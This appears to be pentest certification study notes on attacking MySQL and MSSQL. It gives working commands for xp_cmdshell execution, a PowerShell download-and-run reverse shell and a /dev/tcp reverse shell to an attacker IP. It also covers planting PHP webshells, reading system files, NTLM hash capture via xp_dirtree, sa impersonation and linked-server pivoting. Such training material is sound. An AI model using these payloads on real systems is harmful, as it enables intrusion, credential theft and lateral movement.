---
title: Attacking SQL Databases
date: 2026-04-29 10:35:00
categories:
  - Attacking Common Services
tags:
  - SQL
  - MySQL
  - MSSQL
  - Databases
  - Pentesting
type: CPTS
excerpt: A CPTS playbook for enumerating, attacking, and abusing SQL database services.
---

<!-- MINDSET -->
  

  <!-- TOC -->
  

  <!-- ══════════════════════════════════════════
       SECTION 1: WHY TARGET
  ══════════════════════════════════════════ -->
  <section class="article-section" id="section-1">
    <div class="section-header">
      
      <h2>Why Target <span class="hl">SQL Databases?</span></h2>
    </div>
    

    <p>MySQL and Microsoft SQL Server (MSSQL) are <strong>relational database management systems (RDBMS)</strong> that store data in structured tables and use SQL for querying. They are considered <strong>high-value targets</strong> in penetration testing for two reasons:</p>

    <ol class="steps">
      <li><p><strong>They hold the most sensitive data:</strong> user credentials, PII, business logic, tokens, payment info, and application configurations.</p></li>
      <li><p><strong>They often run with privileged OS accounts.</strong> This means gaining access to a database can translate directly into OS-level privilege escalation.</p></li>
    </ol>

    <p>Depending on your privileges once inside, you may be able to:</p>

    <div class="table-wrap">
      <table>
        <thead><tr><th>Capability</th><th>Impact</th></tr></thead>
        <tbody>
          <tr><td>Read / modify database contents</td><td>Data exfiltration, credential theft</td></tr>
          <tr><td>Execute OS commands</td><td>Full system compromise</td></tr>
          <tr><td>Read local files</td><td>Config files, SSH keys, /etc/passwd</td></tr>
          <tr><td>Write files to disk</td><td>Drop webshells, backdoors</td></tr>
          <tr><td>Capture NTLM hashes</td><td>Credential relay / cracking</td></tr>
          <tr><td>Impersonate users</td><td>Privilege escalation within SQL</td></tr>
          <tr><td>Communicate with linked servers</td><td>Lateral movement to other systems</td></tr>
        </tbody>
      </table>
    </div>
  </section>

  <!-- ══════════════════════════════════════════
       SECTION 2: ENUMERATION
  ══════════════════════════════════════════ -->
  <section class="article-section" id="section-2">
    <div class="section-header">
      
      <h2><span class="hl">Enumeration</span> — Finding the Database</h2>
    </div>
    

    <p>Before you attack anything, you need to identify what's running and where.</p>

    <h3 class="sub">Default Ports</h3>
    <div class="table-wrap">
      <table>
        <thead><tr><th>Database</th><th>Protocol</th><th>Default Port</th></tr></thead>
        <tbody>
          <tr><td>MSSQL</td><td>TCP</td><td>1433</td></tr>
          <tr><td>MSSQL (UDP discovery)</td><td>UDP</td><td>1434</td></tr>
          <tr><td>MSSQL (hidden mode)</td><td>TCP</td><td>2433</td></tr>
          <tr><td>MySQL / MariaDB</td><td>TCP</td><td>3306</td></tr>
        </tbody>
      </table>
    </div>

    <h3 class="sub">Banner Grabbing with Nmap</h3>
    <p>Use Nmap's default scripts (<code>-sC</code>) combined with version detection (<code>-sV</code>) to fingerprint the service and extract useful metadata:</p>

    <div class="code-block">
      <div class="code-header">
        <span class="code-label">bash · attacker machine</span>
        
      </div>
      <pre><span class="cmt"># Scan MSSQL default port</span>
<span class="cmd">nmap</span> <span class="flag">-Pn -sV -sC -p1433</span> &lt;target_ip&gt;

<span class="cmt"># Scan MySQL default port</span>
<span class="cmd">nmap</span> <span class="flag">-Pn -sV -sC -p3306</span> &lt;target_ip&gt;</pre>
    </div>

    <div class="callout info">
      <div class="callout-icon">ℹ</div>
      <div class="callout-body">
        <div class="callout-title">Flag Reference</div>
        <p><code>-Pn</code> skips host discovery. <code>-sV</code> detects service version. <code>-sC</code> runs default NSE scripts. Together they extract version, hostname, domain name, and patch level.</p>
      </div>
    </div>

    <h4 class="mini">Expected Output (MSSQL)</h4>
    <div class="code-block">
      <div class="code-header">
        <span class="code-label">nmap output</span>
        
      </div>
      <pre><span class="out">1433/tcp open  ms-sql-s  Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info:
|   Target_Name: HTB
|   NetBIOS_Computer_Name: mssql-test
|   DNS_Domain_Name: HTB.LOCAL
|   Product_Version: 10.0.17763
|   Post-SP patches applied: false     </span><span class="cmt">&lt;-- unpatched = juicy</span></pre>
    </div>

    <div class="callout tip">
      <div class="callout-icon">✓</div>
      <div class="callout-body">
        <div class="callout-title">What to look for</div>
        <p>Version number → search for known CVEs. Hostname/domain → useful for Windows auth. <code>Post-SP patches applied: false</code> → unpatched system. SSL self-signed → no PKI enforcement.</p>
      </div>
    </div>
  </section>

  <!-- ══════════════════════════════════════════
       SECTION 3: AUTH MECHANISMS
  ══════════════════════════════════════════ -->
  <section class="article-section" id="section-3">
    <div class="section-header">
      
      <h2>Authentication <span class="hl">Mechanisms</span></h2>
    </div>
    

    <p>MSSQL supports two authentication modes. Understanding the difference is critical to knowing which attack path to take.</p>

    <div class="table-wrap">
      <table>
        <thead><tr><th>Auth Type</th><th>Description</th><th>Attacker Notes</th></tr></thead>
        <tbody>
          <tr>
            <td><code>Windows Auth</code></td>
            <td>Default. Integrated with Active Directory. SA disabled by default.</td>
            <td>Domain credentials work. Try Pass-the-Hash or Kerberos tickets.</td>
          </tr>
          <tr>
            <td><code>SQL Auth</code></td>
            <td>Separate SQL Server users, not tied to Windows.</td>
            <td>SA account may be enabled. Try brute-force or default creds.</td>
          </tr>
        </tbody>
      </table>
    </div>

    <div class="callout warn">
      <div class="callout-icon">⚠</div>
      <div class="callout-body">
        <div class="callout-title">Common Misconfiguration</div>
        <p>Many organizations enable SQL Authentication with weak passwords for "legacy app compatibility" — then forget about it. The <code>sa</code> account with a default or blank password is still common in the wild.</p>
      </div>
    </div>
  </section>

  <!-- ══════════════════════════════════════════
       SECTION 4: CONNECTING
  ══════════════════════════════════════════ -->
  <section class="article-section" id="section-4">
    <div class="section-header">
      
      <h2>Connecting to the <span class="hl">Database</span></h2>
    </div>
    

    <p>Once you confirm a database service is running, connect to it. Here are all the tools you need for both MySQL and MSSQL from Linux or Windows.</p>

    <h3 class="sub">MySQL — Connect from Linux</h3>
    <div class="code-block">
      <div class="code-header"><span class="code-label">bash</span></div>
      <pre><span class="cmd">mysql</span> <span class="flag">-u</span> &lt;username&gt; <span class="flag">-p</span>&lt;password&gt; <span class="flag">-h</span> &lt;target_ip&gt;

<span class="cmt"># Example</span>
<span class="cmd">mysql</span> <span class="flag">-u</span> julio <span class="flag">-p</span>Password123 <span class="flag">-h</span> &lt;target_ip&gt;</pre>
    </div>

    <h3 class="sub">MSSQL — sqlcmd (Windows)</h3>
    <div class="code-block">
      <div class="code-header"><span class="code-label">cmd</span></div>
      <pre><span class="cmd">sqlcmd</span> <span class="flag">-S</span> &lt;target_ip&gt; <span class="flag">-U</span> &lt;username&gt; <span class="flag">-P</span> <span class="str">'&lt;password&gt;'</span> <span class="flag">-y 30 -Y 30</span>

<span class="cmt"># -y / -Y control column display width for cleaner output</span></pre>
    </div>

    <h3 class="sub">MSSQL — sqsh (Linux)</h3>
    <div class="code-block">
      <div class="code-header"><span class="code-label">bash</span></div>
      <pre><span class="cmd">sqsh</span> <span class="flag">-S</span> &lt;target_ip&gt; <span class="flag">-U</span> &lt;username&gt; <span class="flag">-P</span> <span class="str">'&lt;password&gt;'</span> <span class="flag">-h</span>

<span class="cmt"># For local Windows account authentication:</span>
<span class="cmd">sqsh</span> <span class="flag">-S</span> &lt;target_ip&gt; <span class="flag">-U</span> .\&lt;username&gt; <span class="flag">-P</span> <span class="str">'&lt;password&gt;'</span> <span class="flag">-h</span></pre>
    </div>

    <h3 class="sub">MSSQL — mssqlclient.py (Impacket, Linux)</h3>
    <div class="code-block">
      <div class="code-header"><span class="code-label">bash · impacket</span></div>
      <pre><span class="cmd">mssqlclient.py</span> <span class="flag">-p</span> 1433 &lt;username&gt;@&lt;target_ip&gt;

<span class="cmt"># Impacket will prompt for password</span></pre>
    </div>

    <div class="callout tip">
      <div class="callout-icon">✓</div>
      <div class="callout-body">
        <div class="callout-title">Pro Tip</div>
        <p>When using <code>.\</code> before a username in sqsh, you force local SQL authentication instead of domain/Windows authentication — useful when domain auth fails but SQL auth is enabled.</p>
      </div>
    </div>
  </section>

  <!-- ══════════════════════════════════════════
       SECTION 5: DEFAULT DBs & SYNTAX
  ══════════════════════════════════════════ -->
  <section class="article-section" id="section-5">
    <div class="section-header">
      
      <h2>Default Databases <span class="hl">& SQL Syntax</span></h2>
    </div>
    

    <p>Every SQL engine ships with default system databases. They don't hold company data, but they let you enumerate the server structure.</p>

    <h3 class="sub">MySQL System Databases</h3>
    <div class="table-wrap">
      <table>
        <thead><tr><th>Database</th><th>Purpose</th></tr></thead>
        <tbody>
          <tr><td><code>mysql</code></td><td>Core server tables required by MySQL</td></tr>
          <tr><td><code>information_schema</code></td><td>Metadata about all databases, tables, columns</td></tr>
          <tr><td><code>performance_schema</code></td><td>Low-level server execution monitoring</td></tr>
          <tr><td><code>sys</code></td><td>Helper objects interpreting performance data</td></tr>
        </tbody>
      </table>
    </div>

    <h3 class="sub">MSSQL System Databases</h3>
    <div class="table-wrap">
      <table>
        <thead><tr><th>Database</th><th>Purpose</th></tr></thead>
        <tbody>
          <tr><td><code>master</code></td><td>Instance-level configuration and login info</td></tr>
          <tr><td><code>msdb</code></td><td>Used by SQL Server Agent (scheduled jobs)</td></tr>
          <tr><td><code>model</code></td><td>Template copied to create new databases</td></tr>
          <tr><td><code>resource</code></td><td>Read-only; system objects in sys schema</td></tr>
          <tr><td><code>tempdb</code></td><td>Temporary objects for queries</td></tr>
        </tbody>
      </table>
    </div>

    <h3 class="sub">Core Recon Commands</h3>
    <h4 class="mini">List Databases</h4>
    <div class="code-block">
      <div class="code-header"><span class="code-label">mysql</span></div>
      <pre><span class="kw">SHOW DATABASES</span>;</pre>
    </div>
    <div class="code-block">
      <div class="code-header"><span class="code-label">mssql · sqlcmd</span></div>
      <pre><span class="kw">SELECT</span> name <span class="kw">FROM</span> master.dbo.sysdatabases
GO</pre>
    </div>

    <h4 class="mini">Select a Database</h4>
    <div class="code-block">
      <div class="code-header"><span class="code-label">mysql / mssql</span></div>
      <pre><span class="cmt">-- MySQL</span>
<span class="kw">USE</span> &lt;database_name&gt;;

<span class="cmt">-- MSSQL</span>
<span class="kw">USE</span> &lt;database_name&gt;
GO</pre>
    </div>

    <h4 class="mini">List Tables</h4>
    <div class="code-block">
      <div class="code-header"><span class="code-label">mysql / mssql</span></div>
      <pre><span class="cmt">-- MySQL</span>
<span class="kw">SHOW TABLES</span>;

<span class="cmt">-- MSSQL</span>
<span class="kw">SELECT</span> table_name <span class="kw">FROM</span> &lt;database_name&gt;.INFORMATION_SCHEMA.TABLES
GO</pre>
    </div>

    <h4 class="mini">Dump All Data — The Jackpot Query</h4>
    <div class="code-block">
      <div class="code-header"><span class="code-label">mysql / mssql</span></div>
      <pre><span class="kw">SELECT</span> * <span class="kw">FROM</span> users;   <span class="cmt">-- MySQL</span>
<span class="kw">SELECT</span> * <span class="kw">FROM</span> users GO  <span class="cmt">-- MSSQL</span></pre>
    </div>
    <div class="code-block">
      <div class="code-header"><span class="code-label">sample output</span></div>
      <pre><span class="out">+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  4 | tom           | tom123!    | 2020-07-02 12:23:16 |
+----+---------------+------------+---------------------+</span></pre>
    </div>

    <div class="callout danger">
      <div class="callout-icon">⚡</div>
      <div class="callout-body">
        <div class="callout-title">Attacker Mindset</div>
        <p>Plaintext passwords found. Now try them on SSH, RDP, SMB, VPNs, email portals. Credential reuse is rampant in real environments. One set of database credentials can unlock the entire network.</p>
      </div>
    </div>
  </section>

  <!-- ══════════════════════════════════════════
       SECTION 6: EXECUTE COMMANDS
  ══════════════════════════════════════════ -->
  <section class="article-section" id="section-6">
    <div class="section-header">
      
      <h2>Execute <span class="hl">OS Commands</span> via SQL</h2>
    </div>
    

    <p><strong>What it is:</strong> Abusing database features to run operating system commands directly from a SQL session — gaining control of the underlying system.</p>
    <p><strong>Why it works:</strong> The SQL Server service account (often SYSTEM or a privileged domain account) executes the commands. You inherit its privileges.</p>

    <h3 class="sub">MSSQL — xp_cmdshell</h3>
    <p><code>xp_cmdshell</code> is an extended stored procedure that passes a string to a Windows command shell and returns the output. It is <strong>disabled by default</strong> but can be re-enabled with sufficient privileges.</p>

    <div class="callout info">
      <div class="callout-icon">ℹ</div>
      <div class="callout-body">
        <div class="callout-title">Key Facts</div>
        <p><code>xp_cmdshell</code> is disabled by default. The spawned process runs with the same rights as the SQL Server service account. It is synchronous — waits for the command to complete before returning.</p>
      </div>
    </div>

    <h4 class="mini">Step 1 — Try It (if already enabled)</h4>
    <div class="code-block">
      <div class="code-header"><span class="code-label">mssql</span></div>
      <pre><span class="kw">xp_cmdshell</span> <span class="str">'whoami'</span>
GO

<span class="out">output
---------------------------
no service\mssql$sqlexpress
NULL</span></pre>
    </div>

    <h4 class="mini">Step 2 — Enable xp_cmdshell (if disabled)</h4>
    <div class="code-block">
      <div class="code-header"><span class="code-label">mssql · requires sysadmin</span></div>
      <pre><span class="cmt">-- Allow advanced options</span>
<span class="kw">EXECUTE</span> sp_configure <span class="str">'show advanced options'</span>, 1
GO
<span class="kw">RECONFIGURE</span>
GO

<span class="cmt">-- Enable xp_cmdshell</span>
<span class="kw">EXECUTE</span> sp_configure <span class="str">'xp_cmdshell'</span>, 1
GO
<span class="kw">RECONFIGURE</span>
GO</pre>
    </div>

    <h4 class="mini">Step 3 — Run Commands</h4>
    <div class="code-block">
      <div class="code-header"><span class="code-label">mssql</span></div>
      <pre><span class="cmt">-- Basic recon</span>
<span class="kw">xp_cmdshell</span> <span class="str">'whoami'</span>
GO

<span class="cmt">-- List users</span>
<span class="kw">xp_cmdshell</span> <span class="str">'net user'</span>
GO

<span class="cmt">-- Download and execute a PowerShell reverse shell</span>
<span class="kw">xp_cmdshell</span> <span class="str">'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\"http://&lt;attacker_ip&gt;/shell.ps1\")"'</span>
GO</pre>
    </div>

    <div class="callout warn">
      <div class="callout-icon">⚠</div>
      <div class="callout-body">
        <div class="callout-title">OPSEC Warning</div>
        <p>Enabling <code>xp_cmdshell</code> is a massive red flag for EDR tools and SIEM alerts. In real engagements, consider alternative methods like CLR Assemblies or SQL Server Agent Jobs to avoid detection.</p>
      </div>
    </div>

    <h3 class="sub">MySQL — User Defined Functions (UDF)</h3>
    <p>MySQL doesn't have <code>xp_cmdshell</code>, but it supports <strong>User Defined Functions (UDFs)</strong> — custom shared libraries compiled in C/C++ loaded into MySQL. A well-known UDF for OS command execution exists on GitHub. It's rarely found in production, but worth checking if you have FILE privileges and can write to the plugin directory.</p>
  </section>

  <!-- ══════════════════════════════════════════
       SECTION 7: WRITE FILES
  ══════════════════════════════════════════ -->
  <section class="article-section" id="section-7">
    <div class="section-header">
      
      <h2>Write Local Files <span class="hl">/ Webshells</span></h2>
    </div>
    

    <p><strong>What it is:</strong> Using SQL file-write capabilities to drop a webshell into the web server directory, then accessing it via HTTP to execute commands.</p>

    <h3 class="sub">MySQL — SELECT INTO OUTFILE</h3>

    <h4 class="mini">Step 1 — Check secure_file_priv</h4>
    <div class="code-block">
      <div class="code-header"><span class="code-label">mysql</span></div>
      <pre><span class="kw">SHOW</span> VARIABLES <span class="kw">LIKE</span> <span class="str">"secure_file_priv"</span>;

<span class="out">+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |    &lt;-- Empty = no restriction!</span></pre>
    </div>

    <div class="table-wrap">
      <table>
        <thead><tr><th>secure_file_priv value</th><th>Meaning</th><th>Can write?</th></tr></thead>
        <tbody>
          <tr><td>Empty (blank)</td><td>No restriction</td><td>✅ Yes — anywhere</td></tr>
          <tr><td>A directory path</td><td>Restricted to that directory</td><td>⚠ Only to that dir</td></tr>
          <tr><td>NULL</td><td>Disabled completely</td><td>❌ No</td></tr>
        </tbody>
      </table>
    </div>

    <h4 class="mini">Step 2 — Write the PHP Webshell</h4>
    <div class="code-block">
      <div class="code-header"><span class="code-label">mysql</span></div>
      <pre><span class="kw">SELECT</span> <span class="str">"&lt;?php echo shell_exec($_GET['c']);?&gt;"</span>
<span class="kw">INTO OUTFILE</span> <span class="str">'/var/www/html/webshell.php'</span>;</pre>
    </div>

    <h4 class="mini">Step 3 — Trigger the Webshell</h4>
    <div class="code-block">
      <div class="code-header"><span class="code-label">bash · attacker</span></div>
      <pre><span class="cmt"># Basic command execution</span>
<span class="cmd">curl</span> <span class="str">"http://&lt;target_ip&gt;/webshell.php?c=whoami"</span>

<span class="cmt"># Reverse shell (URL encoded)</span>
<span class="cmd">curl</span> <span class="str">"http://&lt;target_ip&gt;/webshell.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/&lt;attacker_ip&gt;/4444+0>%261'"</span></pre>
    </div>

    <h3 class="sub">MSSQL — OLE Automation File Write</h3>
    <p>MSSQL requires OLE Automation Procedures to be enabled first (admin privileges needed).</p>

    <h4 class="mini">Step 1 — Enable OLE Automation</h4>
    <div class="code-block">
      <div class="code-header"><span class="code-label">mssql</span></div>
      <pre><span class="kw">sp_configure</span> <span class="str">'show advanced options'</span>, 1
GO
<span class="kw">RECONFIGURE</span>
GO
<span class="kw">sp_configure</span> <span class="str">'Ole Automation Procedures'</span>, 1
GO
<span class="kw">RECONFIGURE</span>
GO</pre>
    </div>

    <h4 class="mini">Step 2 — Create a Webshell File</h4>
    <div class="code-block">
      <div class="code-header"><span class="code-label">mssql</span></div>
      <pre><span class="kw">DECLARE</span> @OLE INT
<span class="kw">DECLARE</span> @FileID INT
<span class="kw">EXECUTE</span> sp_OACreate <span class="str">'Scripting.FileSystemObject'</span>, @OLE OUT
<span class="kw">EXECUTE</span> sp_OAMethod @OLE, <span class="str">'OpenTextFile'</span>, @FileID OUT,
<span class="str">'c:\inetpub\wwwroot\webshell.php'</span>, 8, 1
<span class="kw">EXECUTE</span> sp_OAMethod @FileID, <span class="str">'WriteLine'</span>, Null, <span class="str">'&lt;?php echo shell_exec($_GET["c"]);?&gt;'</span>
<span class="kw">EXECUTE</span> sp_OADestroy @FileID
<span class="kw">EXECUTE</span> sp_OADestroy @OLE
GO</pre>
    </div>
  </section>

  <!-- ══════════════════════════════════════════
       SECTION 8: READ LOCAL FILES
  ══════════════════════════════════════════ -->
  <section class="article-section" id="section-8">
    <div class="section-header">
      
      <h2>Read <span class="hl">Local Files</span></h2>
    </div>
    

    <p>Databases with file read permissions can expose sensitive OS-level files without ever running a shell command.</p>

    <h3 class="sub">MSSQL — OPENROWSET BULK</h3>
    <p>By default, MSSQL can read any file the service account has access to using <code>OPENROWSET(BULK...)</code>:</p>

    <div class="code-block">
      <div class="code-header"><span class="code-label">mssql</span></div>
      <pre><span class="kw">SELECT</span> * <span class="kw">FROM</span> OPENROWSET(BULK
N<span class="str">'C:/Windows/System32/drivers/etc/hosts'</span>, SINGLE_CLOB) AS Contents
GO</pre>
    </div>

    <h3 class="sub">MySQL — LOAD_FILE()</h3>
    <p>Requires <code>secure_file_priv</code> to not be NULL and the <code>FILE</code> privilege:</p>

    <div class="code-block">
      <div class="code-header"><span class="code-label">mysql</span></div>
      <pre><span class="kw">SELECT</span> LOAD_FILE(<span class="str">"/etc/passwd"</span>);

<span class="out">+---------------------------+
| LOAD_FILE("/etc/passwd")  |
+---------------------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...</span></pre>
    </div>

    <div class="callout tip">
      <div class="callout-icon">✓</div>
      <div class="callout-body">
        <div class="callout-title">High-Value File Targets</div>
        <p><code>/etc/passwd</code>, <code>/etc/shadow</code> (if privileged), SSH private keys in <code>/home/user/.ssh/id_rsa</code>, web app configs like <code>config.php</code> or <code>web.config</code>, environment files (<code>.env</code>), and Windows SAM / SYSTEM files.</p>
      </div>
    </div>
  </section>

  <!-- ══════════════════════════════════════════
       SECTION 9: HASH CAPTURE
  ══════════════════════════════════════════ -->
  <section class="article-section" id="section-9">
    <div class="section-header">
      
      <h2>Capture MSSQL <span class="hl">Service Hash</span></h2>
    </div>
    

    <p><strong>What it is:</strong> Forcing the MSSQL service account to authenticate to a fake SMB server you control, capturing its NTLMv2 hash in the process.</p>
    <p><strong>Why it works:</strong> Undocumented stored procedures <code>xp_subdirs</code> and <code>xp_dirtree</code> use the SMB protocol to list directories. When pointed at your machine, the SQL Server authenticates automatically — leaking its NTLM hash.</p>

    <ol class="steps">
      <li><p><strong>Start your fake SMB listener</strong> — Responder or impacket-smbserver on your attacker machine.</p></li>
      <li><p><strong>Trigger the authentication</strong> — Execute the stored procedure pointing at your IP.</p></li>
      <li><p><strong>Catch the hash</strong> — Responder intercepts and logs the NTLMv2 hash.</p></li>
      <li><p><strong>Crack or relay the hash</strong> — Use Hashcat to crack offline or relay to another host.</p></li>
    </ol>

    <h4 class="mini">Step 1 — Start Responder</h4>
    <div class="code-block">
      <div class="code-header"><span class="code-label">bash · attacker</span></div>
      <pre><span class="cmt"># Option A: Responder</span>
<span class="cmd">sudo responder</span> <span class="flag">-I</span> tun0

<span class="cmt"># Option B: Impacket SMB server</span>
<span class="cmd">sudo impacket-smbserver</span> share ./ <span class="flag">-smb2support</span></pre>
    </div>

    <h4 class="mini">Step 2 — Trigger via MSSQL</h4>
    <div class="code-block">
      <div class="code-header"><span class="code-label">mssql</span></div>
      <pre><span class="cmt">-- Using xp_dirtree</span>
<span class="kw">EXEC</span> master..xp_dirtree <span class="str">'\\&lt;attacker_ip&gt;\share\'</span>
GO

<span class="cmt">-- Using xp_subdirs</span>
<span class="kw">EXEC</span> master..xp_subdirs <span class="str">'\\&lt;attacker_ip&gt;\share\'</span>
GO</pre>
    </div>

    <h4 class="mini">Step 3 — Hash Captured by Responder</h4>
    <div class="code-block">
      <div class="code-header"><span class="code-label">responder output</span></div>
      <pre><span class="out">[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
[SMB] NTLMv2-SSP Hash     :
demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:010100...</span></pre>
    </div>

    <h4 class="mini">Step 4 — Crack with Hashcat</h4>
    <div class="code-block">
      <div class="code-header"><span class="code-label">bash</span></div>
      <pre><span class="cmd">hashcat</span> <span class="flag">-m 5600</span> hash.txt /usr/share/wordlists/rockyou.txt</pre>
    </div>

    <div class="callout info">
      <div class="callout-icon">ℹ</div>
      <div class="callout-body">
        <div class="callout-title">Real-World Context</div>
        <p>This technique is widely used in internal pentest engagements. No exploit needed — just a misconfigured SQL Server. The captured NTLMv2 hash can be cracked offline or relayed to another Windows service for lateral movement.</p>
      </div>
    </div>
  </section>

  <!-- ══════════════════════════════════════════
       SECTION 10: IMPERSONATION
  ══════════════════════════════════════════ -->
  <section class="article-section" id="section-10">
    <div class="section-header">
      
      <h2>Impersonate Users <span class="hl">in MSSQL</span></h2>
    </div>
    

    <p><strong>What it is:</strong> MSSQL has a special permission called <code>IMPERSONATE</code> that allows a user to temporarily assume another user's identity and permissions. When misconfigured, a low-privilege user can impersonate the <code>sa</code> (System Administrator) account.</p>
    <p><strong>Why it happens:</strong> DBAs sometimes grant <code>IMPERSONATE</code> for application compatibility reasons without realizing it effectively grants sysadmin-level access.</p>

    <h4 class="mini">Step 1 — Find Impersonatable Users</h4>
    <div class="code-block">
      <div class="code-header"><span class="code-label">mssql</span></div>
      <pre><span class="kw">SELECT</span> distinct b.name
<span class="kw">FROM</span> sys.server_permissions a
<span class="kw">INNER JOIN</span> sys.server_principals b
<span class="kw">ON</span> a.grantor_principal_id = b.principal_id
<span class="kw">WHERE</span> a.permission_name = <span class="str">'IMPERSONATE'</span>
GO

<span class="out">name
-----
sa
ben
valentin</span></pre>
    </div>

    <h4 class="mini">Step 2 — Verify Current Privileges</h4>
    <div class="code-block">
      <div class="code-header"><span class="code-label">mssql</span></div>
      <pre><span class="kw">SELECT</span> SYSTEM_USER
<span class="kw">SELECT</span> IS_SRVROLEMEMBER(<span class="str">'sysadmin'</span>)
go

<span class="out">julio         &lt;-- current user
0             &lt;-- not sysadmin (yet)</span></pre>
    </div>

    <h4 class="mini">Step 3 — Impersonate sa</h4>
    <div class="code-block">
      <div class="code-header"><span class="code-label">mssql</span></div>
      <pre><span class="kw">EXECUTE AS LOGIN</span> = <span class="str">'sa'</span>
<span class="kw">SELECT</span> SYSTEM_USER
<span class="kw">SELECT</span> IS_SRVROLEMEMBER(<span class="str">'sysadmin'</span>)
GO

<span class="out">sa            &lt;-- now impersonating sa!
1             &lt;-- IS sysadmin!</span></pre>
    </div>

    <h4 class="mini">Step 4 — Revert When Done</h4>
    <div class="code-block">
      <div class="code-header"><span class="code-label">mssql</span></div>
      <pre><span class="kw">REVERT</span></pre>
    </div>

    <div class="callout tip">
      <div class="callout-icon">✓</div>
      <div class="callout-body">
        <div class="callout-title">Pro Tip</div>
        <p>Run <code>EXECUTE AS LOGIN</code> in the <code>master</code> database context — all users have access to it by default. Switch first with <code>USE master</code>. If the target user doesn't have access to your current DB, you'll get an error.</p>
      </div>
    </div>
  </section>

  <!-- ══════════════════════════════════════════
       SECTION 11: LINKED SERVERS
  ══════════════════════════════════════════ -->
  <section class="article-section" id="section-11">
    <div class="section-header">
      
      <h2>Linked Servers — <span class="hl">Lateral Movement</span></h2>
    </div>
    

    <p><strong>What it is:</strong> MSSQL supports <em>linked servers</em> — a configuration allowing one SQL Server instance to execute queries on another remote SQL Server (or Oracle, etc.).</p>
    <p><strong>Why it matters for attackers:</strong> If a linked server is configured with a highly privileged account (especially <code>sa</code>), you can execute queries — and OS commands — on remote systems from your current foothold. Classic lateral movement, no exploit needed.</p>

    <h4 class="mini">Step 1 — Enumerate Linked Servers</h4>
    <div class="code-block">
      <div class="code-header"><span class="code-label">mssql</span></div>
      <pre><span class="kw">SELECT</span> srvname, isremote <span class="kw">FROM</span> sysservers
GO

<span class="out">srvname                    isremote
-------------------------  --------
DESKTOP-MFERMN4\SQLEXPRESS    1      &lt;-- remote server
10.0.0.12\SQLEXPRESS           0      &lt;-- linked server</span></pre>
    </div>

    <h4 class="mini">Step 2 — Query the Linked Server</h4>
    <div class="code-block">
      <div class="code-header"><span class="code-label">mssql</span></div>
      <pre><span class="kw">EXECUTE</span>(<span class="str">'select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')'</span>)
AT [10.0.0.12\SQLEXPRESS]
GO

<span class="out">DESKTOP-0L9D4KA\SQLEXPRESS  Microsoft SQL Server 2019  sa_remote  1</span>
<span class="cmt">                                                                    ^ sysadmin on remote!</span></pre>
    </div>

    <h4 class="mini">Step 3 — Execute OS Commands on Remote Server</h4>
    <div class="code-block">
      <div class="code-header"><span class="code-label">mssql · via linked server</span></div>
      <pre><span class="kw">EXECUTE</span>(<span class="str">'xp_cmdshell ''whoami'''</span>) AT [10.0.0.12\SQLEXPRESS]
GO</pre>
    </div>

    <div class="callout danger">
      <div class="callout-icon">⚡</div>
      <div class="callout-body">
        <div class="callout-title">Lateral Movement Achieved</div>
        <p>You started with one compromised database and now have OS-level code execution on a second server — without any CVE or exploit. Pure misconfiguration abuse. This is why linked servers should be audited in every pentest.</p>
      </div>
    </div>
  </section>

  <!-- ══════════════════════════════════════════
       SECTION 12: CHEAT SHEET
  ══════════════════════════════════════════ -->
  <section class="article-section" id="section-12">
    <div class="section-header">
      
      <h2>Attack <span class="hl">Cheat Sheet</span></h2>
    </div>
    

    <h3 class="sub">Full Attack Flow</h3>
    <div class="flow">
      <div class="flow-step">Nmap Scan</div>
      <div class="flow-arrow">→</div>
      <div class="flow-step">Connect</div>
      <div class="flow-arrow">→</div>
      <div class="flow-step">Enumerate DBs/Tables</div>
      <div class="flow-arrow">→</div>
      <div class="flow-step">Dump Credentials</div>
      <div class="flow-arrow">→</div>
      <div class="flow-step">Escalate</div>
      <div class="flow-arrow">→</div>
      <div class="flow-step">Pivot</div>
    </div>

    <h3 class="sub">SQL Syntax Quick Reference</h3>
    <div class="table-wrap">
      <table>
        <thead><tr><th>Goal</th><th>MySQL</th><th>MSSQL</th></tr></thead>
        <tbody>
          <tr><td>List databases</td><td><code>SHOW DATABASES;</code></td><td><code>SELECT name FROM master.dbo.sysdatabases</code></td></tr>
          <tr><td>Select database</td><td><code>USE &lt;db&gt;;</code></td><td><code>USE &lt;db&gt; GO</code></td></tr>
          <tr><td>List tables</td><td><code>SHOW TABLES;</code></td><td><code>SELECT table_name FROM &lt;db&gt;.INFORMATION_SCHEMA.TABLES</code></td></tr>
          <tr><td>Dump table</td><td><code>SELECT * FROM &lt;table&gt;;</code></td><td><code>SELECT * FROM &lt;table&gt; GO</code></td></tr>
          <tr><td>Read file</td><td><code>SELECT LOAD_FILE('/etc/passwd');</code></td><td><code>SELECT * FROM OPENROWSET(BULK N'C:/file', SINGLE_CLOB) AS c</code></td></tr>
          <tr><td>Write webshell</td><td><code>SELECT '...' INTO OUTFILE '/path/shell.php'</code></td><td>OLE Automation + sp_OACreate</td></tr>
          <tr><td>OS command</td><td>UDF (rare)</td><td><code>xp_cmdshell 'whoami'</code></td></tr>
          <tr><td>Steal hash</td><td>—</td><td><code>EXEC xp_dirtree '\\&lt;attacker_ip&gt;\share\'</code></td></tr>
          <tr><td>Impersonate user</td><td>—</td><td><code>EXECUTE AS LOGIN = 'sa'</code></td></tr>
          <tr><td>Query linked server</td><td>—</td><td><code>EXECUTE('query') AT [server]</code></td></tr>
        </tbody>
      </table>
    </div>

    <h3 class="sub">Tools Reference</h3>
    <div class="table-wrap">
      <table>
        <thead><tr><th>Tool</th><th>Purpose</th><th>Platform</th></tr></thead>
        <tbody>
          <tr><td><code>nmap</code></td><td>Port scan & banner grabbing</td><td>Linux/Win</td></tr>
